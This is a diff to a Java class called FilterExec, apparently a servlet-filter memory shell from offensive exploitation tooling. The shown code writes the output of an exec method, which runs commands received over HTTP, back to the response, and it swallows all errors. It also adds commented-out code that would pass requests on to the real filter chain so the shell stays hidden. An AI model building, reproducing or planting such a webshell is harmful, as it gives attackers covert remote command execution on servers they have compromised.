@@ -51,9 +51,31 @@ public class FilterExec implements InvocationHandler {
             invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
             invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
-        } catch (Exception e) {
+        } catch (Throwable e) {
+//            doFilter(servletRequest, servletResponse, filterChain);
         }
+
+
     }
+
+//    // TODO 需要测试 jakarta
+//    public static void doFilter(Object servletRequest, Object servletResponse, Object filterChain){
+//        try{
+//            Class reqCls;
+//            Class repCls;
+//            try {
+//                reqCls = Class.forName("javax.servlet.ServletRequest");
+//                repCls = Class.forName("javax.servlet.ServletResponse");
+//            }catch (Exception e){
+//                reqCls = Class.forName("jakarta.servlet.ServletRequest");
+//                repCls = Class.forName("jakarta.servlet.ServletResponse");
+//            }
+//
+//            invokeMethod(filterChain.getClass(), filterChain, "doFilter", new Class[]{reqCls, repCls}, new Object[]{servletRequest, servletResponse});
+//        }catch (Throwable e){
+//
+//        }
+//    }
 
     public static String exec(String str) throws Exception {
         String[] cmd;
@@ -103,4 +125,11 @@ public class FilterExec implements InvocationHandler {
         method.setAccessible(true);
         return method.invoke(obj, args);
     }
+
+//    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+//        Method method = cls.getDeclaredMethod(methodName, argsClass);
+//        method.setAccessible(true);
+//        Object object = method.invoke(obj, args);
+//        return object;
+//    }
 }
